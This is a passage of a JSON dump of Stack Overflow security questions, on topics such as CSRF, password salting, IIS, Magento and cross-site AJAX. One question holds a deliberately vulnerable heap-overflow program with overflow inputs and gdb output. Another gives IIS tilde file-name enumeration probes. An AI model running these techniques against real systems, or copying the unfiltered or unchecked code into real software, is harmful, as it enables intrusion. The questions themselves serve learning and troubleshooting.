project but I have some fears from hacking my server</p>\n\n<p>If there's red5 server protection guide ,tips or informations about security please help me</p>\n\n<p>thanks in advance</p>\n"},{"tags":["php","security"],"answer_count":4,"favorite_count":6,"up_vote_count":11,"down_vote_count":0,"view_count":2589,"score":11,"question_id":4773969,"title":"Is it safe to trust $_SERVER['REMOTE_ADDR']?","body":"<p>Is it safe to trust $_SERVER['REMOTE_ADDR']? Can it be substituted by changing the header of request or something like that?</p>\n\n<p>Is it safe to write something like that?</p>\n\n<pre><code>if ($_SERVER['REMOTE_ADDR'] == '222.222.222.222') { // my ip address\n    $grant_all_admin_rights = true;\n}\n</code></pre>\n"},{"tags":["security","file-upload","file-sharing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12145197,"title":"A proper secure file sharing portal to offer clients, for their clients","body":"<p>We often work with companies that are looking for a way to share files with their clients (in both directions). They need a reasonable degree of security, and something that is simple and professional. We have previously used scripts from ActiveDen and CodeCanyon, but I have found them to be lacking; very little support and I've ended up fixing the code myself without any response from the developers. There are one or two WordPress plugins that look promising, but the security is specious and it seems like overkill and more possible vulnerabilities when the site is not using WordPress to begin with.</p>\n\n<p>I am wondering if you programmers know of anything out there that we can offer to our clients:</p>\n\n<ul>\n<li>Admin and multiple clients can log in </li>\n<li>Admin can add/edit clients</li>\n<li>Both can upload files Files are stored in a secure manner and are private</li>\n<li>Support, simplicity, and professional appearance</li>\n<li>Preferably something involving no more than 1 to 2 hours of setup</li>\n</ul>\n\n<p>Even a web-app of some sort that requires fees, if it is reasonable, would work. It seems like a simple thing that I know exists in several forms. I've done lots of searches but haven't come up with any solid product.</p>\n"},{"tags":["security","firefox","selenium","popup"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":218,"score":0,"question_id":12140781,"title":"Disable \"Although this page is encrypted....\" in Firefox 14","body":"<p>I have been using Selenium RC for automating my test cases. I have stumped across a case wherein a security pop up appears &amp; I am unable to override using either code/ Firefox browser settings.</p>\n\n<p>Pop up Message - \"Although this page is encrypted, the information you have entered is to be sent over an unencrypted connection and could easily be read by a third party. Are you sure you want to continue sending this information?\"</p>\n\n<p>I have browsed through a lot of solutions posted in this forum &amp; google. Nothing seem to work.\nMy Browser version is 14.0.1. Most of the solutions available for FF settings are FF 3.0 &amp; older which does not apply.</p>\n\n<p>I have even tried <strong>about:config</strong> &amp; disabled the below set of keys. Doesn't help either.</p>\n\n<pre><code>security.warn_entering_secure\nsecurity.warn_entering_secure.show_once\nsecurity.warn_entering_weak\nsecurity.warn_entering_weak.show_once\nsecurity.warn_leaving_secure\nsecurity.warn_leaving_secure.show_once\nsecurity.warn_submit_insecure\nsecurity.warn_submit_insecure.show_once\nsecurity.warn_viewing_mixed\nsecurity.warn_viewing_mixed.show_once\n</code></pre>\n"},{"tags":["security","unit-testing","cakephp","phpunit"],"answer_count":1,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":103,"score":6,"question_id":12117598,"title":"SecurityComponent black-holing my controller test case","body":"<p>Here's my <strong>UsersController</strong> test case:</p>\n\n<pre><code>&lt;?php\nApp::uses('UsersController', 'Controller');\n\nclass TestUsersController extends UsersController {\n\n    public $autoRender = false;\n\n    public function redirect($url, $status = null, $exit = true) {\n        $this-&gt;redirectUrl = $url;\n    }\n\n    public function render($action = null, $layout = null, $file = null) {\n        $this-&gt;renderedAction = $action;\n    }\n\n    public function _stop($status = 0) {\n        $this-&gt;stopped = $status;\n    }\n}\n\nclass UsersControllerTestCase extends ControllerTestCase {\n\n    public $fixtures = array('app.user');\n\n    public function setUp() {\n        parent::setUp();\n        $this-&gt;Users = new TestUsersController();\n        $this-&gt;Users-&gt;constructClasses();\n    }\n\n    public function tearDown() {\n        unset($this-&gt;Users);\n\n        parent::tearDown();\n    }\n\n    public function testAdminSearchStudents() {\n        $data = array('User' =&gt; array('search' =&gt; 'Ipsum'));\n        $result = $this-&gt;testAction('/admin', array('return' =&gt; 'vars', 'method' =&gt; 'post', 'data' =&gt; $data));\n        $this-&gt;assertCount(1, $result['users']);\n    }\n\n}\n</code></pre>\n\n<p>There's nothing special about my UsersController, but it uses the SecurityComponent (inherited from AppController).</p>\n\n<p>And when I run the tests, i get the infamous:</p>\n\n<blockquote>\n  <p>The request has been black-holed Test case:\n  UsersControllerTestCase(testAdminSearchStudents)</p>\n</blockquote>\n\n<p>I think it's because i'm forging a POST request without the CSRF token and referal?</p>\n\n<p>What should I do to make this work <strong>without removing the Security component</strong> from my Controller?</p>\n\n<p>I'm not sure if this will help, but here's the important part of the stack trace:</p>\n\n<pre><code>/var/www/source/cakephp/lib/Cake/Controller/Component/SecurityComponent.php : 230\nSecurityComponent::startup\n/var/www/source/cakephp/lib/Cake/Utility/ObjectCollection.php : 130\nObjectCollection::trigger\n/var/www/source/cakephp/lib/Cake/Event/CakeEventManager.php : 246\n/var/www/source/cakephp/lib/Cake/Controller/Controller.php : 671\n/var/www/source/cakephp/lib/Cake/Routing/Dispatcher.php : 183\n/var/www/source/cakephp/lib/Cake/Routing/Dispatcher.php : 161\n/var/www/source/cakephp/lib/Cake/TestSuite/ControllerTestCase.php : 271\nControllerTestCase::_testAction\n/var/www/source/cakephp/lib/Cake/TestSuite/ControllerTestCase.php : 189\n</code></pre>\n\n<p>Regards</p>\n"},{"tags":["c","security","ubuntu","heap","kubuntu"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":121,"score":1,"question_id":11878755,"title":"Heap Overflow Issue - Can Overwrite Chunk Header, Corrupt Free(), But Program Doesn't Crash","body":"<p>I have been studying computer vulnerabilities and have been working on this problem for countless hours.\nI cannot seem to get the heap to overflow correctly. Despite glibc detecting a memory corruption, after disabling MALLOC_CHECK_ my program executes and exits correctly as if overwriting the chunk header didn't matter. I am running Kubuntu 12.04.</p>\n\n<p>This exercise is from \"The Shellcoder's Handbook, 2nd Edition\" and is also featured on Heap Overflow tutorials online. I have followed the instructions to a T multiple times and have received the same result.</p>\n\n<p>Here is the code of my program:</p>\n\n<pre><code>/*basicheap*/\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\n\nint main(int argc, char ** argv){\n\n    char *buf;\n    char *buf2;\n\nbuf=(char*)malloc(1024);\nbuf2=(char*)malloc(1024);\nprintf(\"buf=%p buf2=%p\\n\", buf, buf2);\nstrcpy(buf,argv[1]);\nfree(buf2);\nfree(buf);\n}\n</code></pre>\n\n<p>when I write past the buffer with glibc on:</p>\n\n<pre><code>xxx@xxx-xxx:~/CProgs$ ./basicheap $(perl -e 'print \"A\"x1028')\nbuf=0x9356718 buf2=0x9356b20\n*** glibc detected *** ./basicheap: double free or corruption (!prev): 0x09356b20 ***\n======= Backtrace: =========\n[0x804abff]\n[0x8048f4a]\n[0x80490d6]\n[0x8048e29]\n======= Memory map: ========\n08048000-080ec000 r-xp 00000000 08:07 6816172    /home/xxx/CProgs/basicheap\n080ec000-080ee000 rw-p 000a3000 08:07 6816172    /home/xxx/CProgs/basicheap\n080ee000-080f0000 rw-p 00000000 00:00 0 \n09355000-09377000 rw-p 00000000 00:00 0          [heap]\nb772a000-b772c000 rw-p 00000000 00:00 0 \nb772c000-b772d000 r-xp 00000000 00:00 0          [vdso]\nbfc14000-bfc36000 rw-p 00000000 00:00 0          [stack]\nAborted (core dumped)\nxxx@xxx-xxx:~/CProgs$ \n</code></pre>\n\n<p>When I write past the buffer with glibc off:</p>\n\n<pre><code>xxx@xxx-xxx:~/CProgs$ MALLOC_CHECK_=0 ./basicheap $(perl -e 'print \"A\"x1028')\nbuf=0xa077718 buf2=0xa077b20\nxxx@xxx-xxx:~/CProgs$\n</code></pre>\n\n<p>GDB of the Chunk header without overwrite:</p>\n\n<pre><code>(gdb) run $(perl -e 'print \"A\"x1024')\nStarting program: /home/xxx/CProgs/basicheap $(perl -e 'print \"A\"x1024')\nbuf=0x80f1718 buf2=0x80f1b20\n\nBreakpoint 1, main (argc=2, argv=0xbfffedf4) at basicheap.c:16\n16      free(buf2);\n(gdb) x/x buf2-4\n0x80f1b1c:      0x00000409\n(gdb) x/x buf2-8\n0x80f1b18:      0x00000000\n(gdb) x/x buf2-12\n0x80f1b14:      0x41414141\n(gdb) \n</code></pre>\n\n<p>GDB of the chunk header with overwrite:</p>\n\n<pre><code>(gdb) run $(perl -e 'print \"A\"x1032')\nStarting program: /home/xxx/CProgs/basicheap $(perl -e 'print \"A\"x1032')\nbuf=0x80f1718 buf2=0x80f1b20\n\nBreakpoint 1, main (argc=2, argv=0xbfffede4) at basicheap.c:16\n16      free(buf2);\n(gdb) x/x buf2-4\n0x80f1b1c:      0x41414141\n(gdb) x/x buf2-8\n0x80f1b18:      0x41414141\n(gdb) x/x buf2-12\n0x80f1b14:      0x41414141\n(gdb) \n</code></pre>\n\n<p>Both times the program exits normally.\nWhat am I missing? Did they change up how the heap works on the latest versions of Ubuntu?\nAny help would be greatly appreciated!</p>\n\n<p>UPDATE: I have stepped through the assembly in gdb and have found that my program enters the function free_check() and the function mem2chunk_check().</p>\n\n<p>In the mem2chunk_check() function, my overwritten value is picked up in the ESI register, and the EDI register points to the address of that value. The only thing I see it doing with my value in ESI is subtracting 1 and then dumping the value.</p>\n\n<p>I have not been able to find any documentation on the mem2chunk_check() function after many google searches.</p>\n\n<p>Are these heap overflows obsolete on modern systems?</p>\n"},{"tags":["asp.net","security","iis","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":174,"score":1,"question_id":11948857,"title":"IIS tilde vulnerability issue","body":"<p>Here is issue that we have on one of our site:</p>\n\n<p><strong>File/directory name bruteforcing using the Windows file system shorthand characters and status returns codes</strong></p>\n\n<pre><code>It is possible to find an unknown filename up to six characters by using shorthand file characters such as ~1 and\n    *Example: site.com/admin/uplo*~1*/.aspx\nThis attack relies on reading different error codes the webserver responds with when the file(s) exist or not. Lets say the file upload.aspx exists in the directory admin. Our attacks responses would look like this:\n    site.com/admin/uplo*~1*/.aspx  IIS returns HTTP 404 File Not Found (valid file)\n    site.com/admin/uplp*~1*/.aspx  IIS returns HTTP 400 Bad Request (invalid file)\n        *Note that IIS 7.x responds with different error codes (00 when valid) instead of http status codes\n</code></pre>\n\n<p><strong>More Details</strong>\n<a href=\"http://www.alertlogic.com/internet-information-server-iis-exploitation-2/\" rel=\"nofollow\">http://www.alertlogic.com/internet-information-server-iis-exploitation-2/</a></p>\n\n<p><strong>One of the possible solutions:</strong>\n...\n If possible you may want to look into using URL rewriting to not allow any URL with a tilde character to be accepted\n...</p>\n\n<p><strong>Question:</strong>\nHow to do that? what regular expression should be used in url rewriting rule in order to discard ~ character in all URL on the website (ASP.NET 3.5)</p>\n"},{"tags":["ruby","security","session","sinatra","session-fixation"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":281,"score":2,"question_id":11337630,"title":"Preventing session fixation in ruby sinatra","body":"<p>Most of the session fixation topics in ruby are mostly related to rails. Are there any session fixation vulnerabilities in sinatra? In rails we are mostly recommended to do reset_session before assigning sessions. How can we prevent session fixation in sinatra?</p>\n"},{"tags":["git","security","repository","versioning","user-permissions"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":86,"score":4,"question_id":11771330,"title":"How do I give coders selective access to code in my Git Repo?","body":"<p>We're getting a freelancer to work on parts of our webapp - and I'd like to restrict his access to just the front end parts of the our code repo - is there a way to do this in Git? We're using bitbucket to host the repo. We have a lot of unique propreitary backend code that we dont want him to see and he doesnt need to see in order to do his job. </p>\n"},{"tags":["sql-server","security","shared-hosting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12142577,"title":"Is this normal behavior when connecting to remote database that is located on shared hosting?","body":"<p>So I have a shared hosting for ASP.NET MVC3 and I just created a new database on Plesk.</p>\n\n<p>Next I wanted to connect to database remotely using Sql Manager and I entered server name, username and password.</p>\n\n<p>Everything fine so far but after I clicked on Database Name, it gave me a list of all sort of databases I never heard of.I guess those are databases of other people.</p>\n\n<p>I am wondering is this normal behavior?</p>\n"},{"tags":["php","security","phpass"],"answer_count":3,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":102,"score":5,"question_id":12140178,"title":"Proper salting and using PHPass","body":"<p>I've been using PHPass to hash my passwords for a long time. I admit that there's still things I don't fully understand (or ignore) to hash a password properly so today I was reviewing all the info I could find about it.</p>\n\n<p>Reviewing PHPass documents, I've steped into this:</p>\n\n<blockquote>\n  <p>Besides the actual hashing, phpass transparently generates random salts when a new password or passphrase is hashed, and it encodes the hash type, the salt, and the password stretching iteration count into the \"hash encoding string\" that it returns. When phpass authenticates a password or passphrase against a stored hash, it similarly transparently extracts and uses the hash type identifier, the salt, and the iteration count out of the \"hash encoding string\". <strong>Thus, you do not need to bother with salting and stretching on your own</strong> - phpass takes care of these for you. </p>\n</blockquote>\n\n<p>I've bolded the sentence that bothered me.<br>\nI always though that the salt should be somewhat secret, in the sense that it should not be known to the attacker. So if a understood correctly, PHPass stores the salt used in the same hash so it is able to use it when comparing passwords and check if valid.<br>\nMy questions are</p>\n\n<ol>\n<li>Is this secure? If the hash is compromised, the attacker has the salt used to hash the password... There's something I miss here.</li>\n<li>I'm here really free to bother about salting passwords? Can I really rely on PHPass?</li>\n</ol>\n"},{"tags":["c#",".net","security","windows-server-2008","windows-server-2008-r2"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":142,"score":1,"question_id":11683334,"title":"Getting elevated permissions in code","body":"<p>A console-app runs on a server in a domain and is tasked with deleting some home areas of users, who are no longer active. </p>\n\n<p>The account runs under the context of an account, that is also a member of the Local Administrator group on each storage server, which has \"Full Control\" access to the relevant folders. </p>\n\n<p>This works great on a bunch of older servers, but on Windows 2008 it runs into problems. On these servers, \"Admin Approval Mode\" is enabled for the \"Local Administrator\" group.</p>\n\n<p>For instance, if I right-click a folder and try to access properties/security (using the same service account), I get this prompt:</p>\n\n<p><img src=\"http://i.stack.imgur.com/BmdqE.png\" alt=\"enter image description here\"></p>\n\n<p>I can press continue, and then proceed to use the full control permissions. If I do the same when deleting files, things work like intended.</p>\n\n<p>There are two potential solutions, as I see it: </p>\n\n<ol>\n<li>The \"Admin approval mode\" is removed. This is not a viable option according to the security-people here.</li>\n<li>The console-app can somehow do the code-equivalent of pressing \"Continue\" and proceeding.</li>\n</ol>\n\n<p>Is option no. 2 possible? If so, what would that code look like - or what key concepts do I need to research further to find out?</p>\n"},{"tags":["spring","security","java-ee"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12133923,"title":"Spring Security features","body":"<p>What security features does Spring provide that are not already provided by the Java EE specs?</p>\n\n<p>In the Java EE specs we have:</p>\n\n<ol>\n<li>A range of sevlet security options in the web.xml.  Most people will configure basic or form based authentication. They link their Java EE application to an LDAP server - which stores users / groups.  Request will be encrypted and come in over HTTPS.</li>\n<li>Possibility to annotate any EJB and only allow certain roles execute certain methods</li>\n<li>Ability to check user principle at runtime programmatically</li>\n</ol>\n\n<p>So what security extras does Spring 3.0 give me?</p>\n"},{"tags":["security","email","hacking"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":306,"score":0,"question_id":12140737,"title":"My hotmail account is hacked, how can I recover it?","body":"<p>I am using for a long time Hotmail but it says \"It looks like someone else might be using your account \" and I guess it is hacked in some way. My account is also used for some span messaging to people inside the contacts. I cannot use any option to recover my account. Do you know any way to solve that problem with the account? Do you know any place to talk with about the issue?</p>\n"},{"tags":["security","seo"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12133538,"title":"Prevent Hyperlinks to Bad Domains","body":"<p>I have a forum, user's can post comments, they can also enable/disable and approve comments; however, I can't always trust users will disapprove comments linking to bad domains. Like these: <a href=\"http://www.mywot.com/en/forum/3823-275-bad-domains-to-blacklist\" rel=\"nofollow\">http://www.mywot.com/en/forum/3823-275-bad-domains-to-blacklist</a></p>\n\n<p>My question is two part:</p>\n\n<ol>\n<li><p>If a user does hyperlink to a 'bad domain' like those in the link above, will my forum/forum-category/forum-category-thread be penalised by it, and even if so if I add no-follow to the forum thread's links?</p></li>\n<li><p>Is there a free API service out there, that I can make a request to to get a list of bad domains, so I can then filter them out of users' posts?</p></li>\n</ol>\n\n<p>I maybe being paranoid, but it's probably because I'm not too SEO savvy.</p>\n"},{"tags":["ios","security","data-protection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12139986,"title":"Is there ever a reason to not use NSFileProtectionCompleteUntilFirstUserAuthentication?","body":"<p>iOS 5 added a new data protection attribute, <code>NSFileProtectionCompleteUntilFirstUserAuthentication</code>.</p>\n\n<blockquote>\n  <p>The file is stored in an encrypted format on disk and cannot be accessed until after the device has booted. After the user unlocks the device for the first time, your app can access the file and continue to access it even if the user subsequently locks the device.</p>\n</blockquote>\n\n<p>As an app author, when would you <em>not</em> use this attribute? Obviously it can't apply to files that need to be accessed during or shortly after boot, but this isn't a time non-Apple software can run anyway. Are there any downsides to using it?</p>\n"},{"tags":["vb.net","security","file-permissions","remote-server"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":142,"score":0,"question_id":12113482,"title":"vb setting file permissions on remote WORKGROUP computer","body":"<p>I have spent hours and hours trying to find an example on the following:\nI'm trying to set the NTFS permissions of a file on a remote computer of the same Workgroup (NOT Domain) using vb.net.</p>\n\n<p>The code I used is:</p>\n\n<pre><code>Private Function GrantPermission(fileName As String,\n                                 account As String,\n                                 rights As FileSystemRights,\n                                 controlType As AccessControlType) As Boolean\n\n    Try\n        Dim fileSec As FileSecurity\n\n        If Not My.Computer.FileSystem.FileExists(fileName) Then Return False\n\n        fileSec = File.GetAccessControl(path:=fileName)\n\n        Dim accessRule As FileSystemAccessRule = New FileSystemAccessRule(account, rights, controlType)\n        fileSec.AddAccessRule(accessRule)\n\n        File.SetAccessControl(fileName, fileSec)\n\n    Catch ex As Exception\n        MsgBox(ex.Message)\n        Return False\n\n    End Try\n    Return True\nEnd Function\n</code></pre>\n\n<p>Calling the function with the account parameter being \"Everyone\" works fine and sets the access rights for the group as expected.</p>\n\n<p>Trying to do it for a specific account though, has failed no matter what I tried. The requirement for account is \"domain\\username\" and the remote computer is not on a domain. </p>\n\n<p>a. Trying \"remotecomputername\\username\" fails at </p>\n\n<p><strong>fileSec.AddAccessRule(accessRule)</strong> </p>\n\n<p>with the message: \"<em>Some or all identity references could not be translated.</em>\"</p>\n\n<p>b. Trying \"username\" succeeds BUT the Security rights on the remote computer show an SID instead of a user and they don't work for the user intended.</p>\n\n<p>c. Trying \"localcomputername\\username\" succeeds again BUT the Security rights on the remote computer show \"Account Uknown and an SID instead of a user and they don't work for the user intended.</p>\n\n<p>I cannot think of anything else so any ideas, suggestions, feedback would be most appreciated!</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","spring-security","csrf","spring-webflow"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1568,"score":4,"question_id":2760701,"title":"Prevent Cross-Site Request Forgery in a Spring WebFlow Application","body":"<p>I'm looking for a (hopefully straightforward) way to add <a href=\"http://www.codinghorror.com/blog/2008/10/preventing-csrf-and-xsrf-attacks.html\" rel=\"nofollow\">CSRF</a> protection to an application build on Spring WebFlow 2.</p>\n\n<p>An approach that migrates well to Spring WebFlow 3 (when released) is preferred.</p>\n"},{"tags":["java","security","browser","applet","directory"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12131275,"title":"Directory Reader Applet Loads in Eclipse, but not in Browser","body":"<p>I'm fairly new to programming and I just wrote an applet program that is supposed to list the files in a directory.  The applet works well in eclipse, yet the issue is when I attempt to run the applet in a browser the GUI loads, yet the applet will not respond as it does in eclipse.  Any help would be greatly appreciated. :)</p>\n\n<pre><code>import java.awt.BorderLayout;\nimport java.awt.Color;\nimport java.awt.Font;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.io.File;\nimport javax.swing.JApplet;\nimport javax.swing.JTextArea;\nimport javax.swing.JTextField;\n\npublic class DirReader extends JApplet{\n\nprivate JTextArea outputWindow;\n\nprivate JTextField dirPath;\nprivate String path;\nprivate Font font;\nprivate File folder;\nprivate File[] listOfFiles;\n\npublic void init(){\n\n    font = new Font(\"Times New Roman\", Font.PLAIN, 16);\n\n    dirPath = new JTextField(\"Enter Directory Path\");\n    dirPath.setFont(font);\n\n    outputWindow = new JTextArea();\n    outputWindow.setEditable(false);\n    outputWindow.setFont(font);\n    outputWindow.setBackground(Color.DARK_GRAY);\n    outputWindow.setForeground(Color.ORANGE);           \n\n    add(dirPath, BorderLayout.NORTH);\n    add(outputWindow, BorderLayout.CENTER);\n\n    setSize(400,750);\n\n    dirPath.addActionListener(\n        new ActionListener(){\n            public void actionPerformed(ActionEvent event) {\n                path = dirPath.getText();\n                folder = new File(path);\n                listOfFiles = folder.listFiles();\n                System.out.println(\"Directory path set\");\n                ListOfFiles();\n            }               \n        }\n    );\n\n    System.out.println(\"Progam Intilized:\");\n}\n\npublic void ListOfFiles(){\n\n    outputWindow.setText(null);\n\n    try{\n        for(int counter = 0 ; counter &lt; listOfFiles.length ; counter++ ){               \n\n            if(listOfFiles[counter].isFile()){  \n                outputWindow.append(\"[FILE] \" + listOfFiles[counter].getName()+ \"\\n\");\n                System.out.println(\"[FILE] \" + listOfFiles[counter].getName());\n            }\n            else if(listOfFiles[counter].isDirectory()){\n                outputWindow.append(\"[DIR] \" + listOfFiles[counter].getName() + \"\\n\");\n                System.out.println(\"[DIR] \" + listOfFiles[counter].getName());\n            }                           \n        }\n    }catch(Exception e){\n        System.out.println(\"Error: Directory could not be found.\");\n\n        outputWindow.setText(\"Error: Could not find directory.\");\n    }\n}\n}\n</code></pre>\n"},{"tags":["php","html","security","iframe","content"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12133502,"title":"Capture data from IFrame","body":"<p>I have a PHP page with IFrame, the iframe's source is another domain and the user needs to fill out the form inside that frame. I need to write the content the user is submitting into the IFrame into my php page somehow so the users won't need to write the same things twice. </p>\n\n<p>I've searched on the internet, but no success. I know this is somewhat security related, but I really need to do it, one way or another, so please point me out to some links where I can find something useful. </p>\n\n<p>I was thinking something like a proxy, and before the iframe content is being submitted to the source, the data will pass through the proxy and this way I can save it...Or maybe that's not possible, I am not sure. That's why I need your help. \nI can't disclose any code but I can provide some examples if you need them that much, I just think it won't be necessary since I provided a good explanation of what I need.</p>\n\n<p>Thanks a lot in advance. </p>\n"},{"tags":["security","haskell","ghc"],"answer_count":1,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":116,"score":6,"question_id":12133000,"title":"After upgrading to GHC7, all programs suddenly fail saying \"Most RTS options are disabled. Link with -rtsopts to enable them.\"","body":"<p>Haskell tools compiled in the upgraded environment fail with this message, regardless of command line parameters.</p>\n"},{"tags":["c#","asp.net",".net","security","file-download"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":108,"score":0,"question_id":12132722,"title":"How to export dataset to xls and save on server harddisk","body":"<p>I used the following code to convert a dataset into xls. It works fine but it throws an error.  (Some formatting problem) </p>\n\n<p><strong>I want to save an xls file created in a specific location without the user's permission.</strong></p>\n\n<pre><code>conn.Open();\nSqlDataAdapter getData = new SqlDataAdapter(\"SELECT * FROM profile\", conn);\ndata.Clear();\ngetData.Fill(data);\nconn.Close();\nHttpResponse response = HttpContext.Current.Response;\nresponse.Clear();\nresponse.Charset = \"\";\nresponse.ContentType = \"application/vnd.ms-excel\";\nresponse.AddHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" +\"siv\" +\"\\\"\");\nusing (StringWriter sw = new StringWriter())\nusing (HtmlTextWriter htw = new HtmlTextWriter(sw))\n{\n    DataGrid dg = new DataGrid();\n    dg.DataSource = data.Tables[0];\n    dg.DataBind();\n    dg.RenderControl(htw);\n    response.Write(sw.ToString());\n    response.End();\n}\n</code></pre>\n"},{"tags":["security","osx","root"],"answer_count":7,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2992,"score":3,"question_id":195717,"title":"How can I gain root access on a Mac OS X system without wiping the OS?","body":"<p>My father died recently and I've inherited his Mac. I'd love to put it to use in my own life, but I don't want to wipe its brains out just so I can reconfigure it to use in my network, etc. His old files are historically important to me&mdash;I trust you can understand my desire to keep them.</p>\n\n<p>I can log in as I had an account on the machine before he passed, but that's about it.</p>\n"},{"tags":["security","rest"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12132492,"title":"server-to-server REST API security","body":"<p>We're building a REST API that will only be accessed from a known set of servers. My question is, if there is no access directly from any browser based clients, what security mechanisms are required.</p>\n\n<p>Currently Have:</p>\n\n<ul>\n<li>Obviously over HTTPS</li>\n<li>Have HTTP auth enabled, API consumers have a Key &amp; password</li>\n</ul>\n\n<p>Is it neccessary to:</p>\n\n<ul>\n<li>Create some changing key, e.g. md5(timestamp + token) that is formed for the request and validated at the endpoint?</li>\n<li>Use oauth (2-legged authorization)?</li>\n</ul>\n"},{"tags":["php","mysql","security","magento","sql-injection"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12109056,"title":"Effects of a Magento core modification that disables cart input filtering?","body":"<p>I'm currently working on an already modified version of magento (v 1.6.1).\nThe previous developers have modified the app/core itself, what if I upgrade to the 1.7?\nIt would restore original app/core, am I right? (because I know every mod should be placed under app/local)</p>\n\n<p>Then I noticed, by running diff on the ecommerce and a clean 1.6.1 installation that the developers have applied this modification (lines marked with \"&lt;\" was the original content and \">\" the edited one)</p>\n\n<pre><code>diff app/code/core/Mage/Checkout/controllers/CartController.php\n169c169,170\n&lt;                 $params['qty'] = $filter-&gt;filter($params['qty']);\n---\n&gt;                 #$params['qty'] = $filter-&gt;filter($params['qty']);\n&gt;                 $params['qty'] = $params['qty'];\n311c312,313\n&lt;                 $params['qty'] = $filter-&gt;filter($params['qty']);\n---\n&gt;                 #$params['qty'] = $filter-&gt;filter($params['qty']);\n&gt;                 $params['qty'] = $params['qty'];\n383c385,386\n&lt;                         $cartData[$index]['qty'] = $filter-&gt;filter(trim($data['qty']));\n---\n&gt;                         //$cartData[$index]['qty'] = $filter-&gt;filter(trim($data['qty']));\n&gt;                         $cartData[$index]['qty'] = $data['qty'];\n</code></pre>\n\n<p>As you may notice they disabled $filter->filter and trim.</p>\n\n<p><strong>Doesn't this expose the e-store to SQLInjections or similiar arbitrary code execution?</strong>\nIs there another check that magento performs before to store this data inside the database?</p>\n"},{"tags":["security","ssl-certificate","facebook-canvas","changes"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12130500,"title":"Facebook secure canvas url bypass","body":"<p>I want to make my app public, but I don't have validate SSL cert and hosting with unique IP for it. I read that the changes ommiting https:// will come in October. How can I change my app to working by http until October's changes?</p>\n\n<p>Generally problem for now is: when i enter to facebook via https and go to app, there is a error about untrust cert and apps isn't loaded.</p>\n\n<p>If there is no way to avoid \"migration\" changes, can any1 tell me is there any chance to run MySQL database on Heroku?</p>\n\n<p>Greets,\nPeter.</p>\n"},{"tags":["php","security","encryption","hash","sha"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":84,"score":-1,"question_id":12129995,"title":"Hashing Salting","body":"<p>Hello sorry if this may be a stupid question, I am gonna try a sha+salt for my site. wondering how to randomize my salt. Upon registering so both of them will be hashed into the database. Also is there a need for me to decrpyt both sha and salt for user validation. Would be nice if someone pointed me in the right detection or a good article. Thanks Also I'm new to security stuff on websites I'm still researching what security implementations i would use for my site currently these are what i will be doing.</p>\n\n<ol>\n<li>password hashing</li>\n<li>Anti-SQL injections</li>\n<li>Hiding Values in URL</li>\n</ol>\n\n<p>Would like to know more what should i add to my security. I am making a school management system as a Project.</p>\n\n<p>So far i am looking Into. Anti-bruteforce and my professor gave me a hint about HTTPS.</p>\n\n<p>Also how would i validate a log in if the password is sha+salt encrypted.</p>\n"},{"tags":["security","rest","servlets","sso","saml"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12129247,"title":"SSO credential propagation servlet to rest","body":"<p>I have 2 app servers configured in SSO configuration via SAML2.  SAML2 Identity Provider(Server1) is running a servlet that user calls via the browser &amp; the SAML2 Service provider(Server 2) a REST service. If I call the Servlet via browser get authenticated and then call the REST service from the same browser session I get authenticated via SSO for the REST request. \nHowever the requirement is for user to call the servlet &amp; servlet to call the REST service(using HTTPClient).\nHow can I pass the security tokens from servlet request to REST call so the REST call gets authenticated via SSO.</p>\n"},{"tags":["javascript","ajax","security","xss"],"answer_count":9,"favorite_count":7,"up_vote_count":16,"down_vote_count":0,"view_count":13313,"score":16,"question_id":333532,"title":"Cross-site AJAX requests","body":"<p>I need to make an AJAX request from a website to a REST web service hosted in another domain.</p>\n\n<p>Although this is works just fine in Internet Explorer, other browsers such as Mozilla and Google Chrome impose far stricter security restrictions, which prohibit cross-site AJAX requests.</p>\n\n<p>The problem is that I have no control over the domain nor the web server where the site is hosted. This means that my REST web service must run somewhere else, and I can't put in place any redirection mechanism.</p>\n\n<p>Here is the JavaScript code that makes the asynchronous call:</p>\n\n<pre><code>var serviceUrl = \"http://myservicedomain\";\nvar payload = 